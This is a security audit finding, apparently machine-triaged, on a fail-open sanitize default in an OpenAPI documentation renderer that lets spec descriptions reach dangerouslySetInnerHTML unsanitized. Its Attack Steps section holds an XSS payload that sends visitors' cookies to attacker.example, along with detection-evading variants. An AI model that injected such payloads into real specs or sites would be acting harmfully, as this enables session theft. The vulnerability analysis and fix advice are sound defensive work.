---
Title: sanitize defaults to false — DOMPurify never called without explicit opt-in, XSS by default
ID: H-00-A
Verdict: VALID
Severity-Original: HIGH
Class: XSS
Phase: 6
File: src/services/AcmeNormalizedOptions.ts:317
Source: spec.info.description | spec.info.summary | scheme.description | OAuth flow scope descriptions | every schema description rendered via <Markdown>
Sink: [REDACTED].tsx:31 (dangerouslySetInnerHTML, ungated when options.sanitize=false; SanitizedMdBlock.tsx:16 gate)
Endpoint: n/a (client-side renderer — no HTTP routes)
Handler: [REDACTED].tsx:16 | src/services/AcmeNormalizedOptions.ts:317
Chamber: chamber-01
Triage-Priority: skip
Triage-Exploitability: moderate
Triage-Impact: high
Triage-Reasoning: HIGH XSS via fail-open sanitize default; attacker controls spec content, executes JS in embedding origin for any visitor; no auth required on target app.
Intent-Verdict: intentional-design
Intent-Source: docs/config.md:77-80
Intent-Quote: "sanitize — If set to true, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS."
Intent-Confidence: strong
Context-Reviewer-Reasoning: context-reviewer: docs/config.md:77-80 + 212-214 explicitly model sanitize as an opt-in operator gate; CHANGELOG.md:1965 names untrusted-spec as the XSS mitigation. (prior Triage-Priority: P1)
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Pre-FP-Flag: DUPLICATE of p5-003-sanitize-default-off-xss.md / H-00-A — downstream dedup should merge. Documented as an opt-in insecure default in docs/config.md:77-80 and docs/config.md:212-214 (untrustedSpec alias); CHANGELOG.md:1965 records it as the documented XSS mitigation. Severity adjusted CRITICAL → HIGH on Advocate review (documented-default trade-off, not unknown bug).
Debate: archon/chamber-workspace/chamber-01/debate.md
Origin-Finding: Phase D7 systematic option-gate enumeration
Deep-Probe-Corroboration: probe-workspace/markdown-sanitization PH-02; probe-workspace/options-standalone-theme PH-13/CF-01
---

## Summary

The `sanitize` option (and its deprecated alias `untrustedSpec`) defaults to `false`. When `false`, the `SanitizedMarkdownHTML` component passes the `marked`-rendered HTML directly into `dangerouslySetInnerHTML` without calling DOMPurify. Any Markdown or inline HTML present in the OpenAPI spec (descriptions, summaries, schema field descriptions, OAuth scope descriptions, etc.) is rendered as raw HTML in the visitor's browser. An attacker who controls any string field in the OpenAPI spec can inject arbitrary HTML or JavaScript that executes in the origin of the embedding page.

This is the primary XSS attack surface in Acme. It is especially impactful because:
1. Acme is widely embedded in public-facing API documentation portals.
2. Many deployments use third-party or community-maintained API specs (e.g., OpenAPI specs from npm packages, public API directories like apis.guru) where spec content is not fully controlled by the embedder.
3. DOMPurify 3.2.4 (the installed version) is itself unpatched against 7 active advisories (requiring 3.3.2–3.4.0), meaning even when `sanitize: true` IS set, the sanitizer may be bypassable. But with `sanitize: false` (the default), DOMPurify is not invoked at all.

## Evidence

**Default assignment (AcmeNormalizedOptions.ts:317):**
```ts
this.sanitize = argValueToBoolean(raw.sanitize || raw.untrustedSpec);
```
When both `raw.sanitize` and `raw.untrustedSpec` are `undefined`, this evaluates to `argValueToBoolean(undefined)`.

**argValueToBoolean with undefined input (AcmeNormalizedOptions.ts:76-84):**
```ts
export function argValueToBoolean(val?: string | boolean, defaultValue?: boolean): boolean {
  if (val === undefined) {
    return defaultValue || false;   // defaultValue is not passed → returns false
  }
  ...
}
```
Result: `this.sanitize = false`.

**Sanitization gate (SanitizedMdBlock.tsx:16):**
```ts
const sanitize = (sanitize, html) => (sanitize ? dompurify.sanitize(html) : html);
```
When `options.sanitize` is `false`, `dompurify.sanitize` is never called. The raw `marked()` output goes directly into `dangerouslySetInnerHTML`.

**Injection point — all Markdown-using components:**
- `src/components/ApiInfo/ApiInfo.tsx:108` — `spec.info.description`
- `src/components/ApiInfo/ApiInfo.tsx:107` — `spec.info.summary`
- `[REDACTED].tsx:63` — `scheme.description`
- `[REDACTED].tsx:57-60` — OAuth2 scope description values
- Every schema `description` field rendered via `<Markdown>` throughout the component tree

- Guard stack observed: `sanitize: false` (default) — DOMPurify not invoked
- Object-id parameter: n/a
- Ownership clause: n/a

## Attack Steps

1. Craft an OpenAPI spec with a `<script>` tag or other HTML XSS payload in the `info.description` field:
   ```yaml
   info:
     title: Legitimate API
     description: |
       Normal documentation text.
       <script>fetch('https://attacker.example/exfil?origin='+window.location.origin+'&cookie='+document.cookie)</script>
   ```
2. Host the spec at any CORS-accessible URL, or supply it inline to any Acme-powered documentation portal that does not explicitly set `sanitize: true`.
3. When any visitor loads the documentation page, the `<script>` tag executes in the embedding origin.
4. Alternatively, use an `<img onerror="...">`, `<svg onload="...">`, or CSS-based exfiltration payload to avoid obvious `<script>` detections.

**Compounding factor — playground (demo/playground/hmr-playground.tsx):**
The HMR playground explicitly does NOT set `sanitize: true` in its options object:
```ts
const options: AcmeRawOptions = {
  nativeScrollbars: false,
  maxDisplayedEnumValues: 3,
  schemaDefinitionsTagName: 'schemas',
};
```
Any developer or CI system that serves this playground page publicly (e.g., as a GitHub Pages preview, Netlify preview, or S3-hosted artifact) with the `?url=<attacker-spec>` parameter exposed allows full XSS against the playground's origin.

## Why This Passed SAST

Fail-open defaults are invisible to AST scanners: the code is syntactically correct, and `dangerouslySetInnerHTML` usage is intentional. The issue is the absence of a mandatory sanitization call, which no structural rule flags as a missing function invocation. Taint-flow analysis would reach the `dangerouslySetInnerHTML` call but would need to understand that the conditional sanitizer is always bypassed at the default configuration.

## Recommended Fix

Change the `sanitize` default to `true`. If backward compatibility is a concern, keep `sanitize: false` as the documented default but add a console warning when Acme is initialized without an explicit `sanitize` value and a network-fetched spec URL is provided. Alternatively, promote `untrustedSpec`/`sanitize` to a required option with no default, forcing every embedder to make an explicit trust decision.

In all cases, upgrade DOMPurify from 3.2.4 to at minimum 3.3.2 (ideally 3.4.0) to close the 7 active advisory window, so that `sanitize: true` provides the protection users expect.
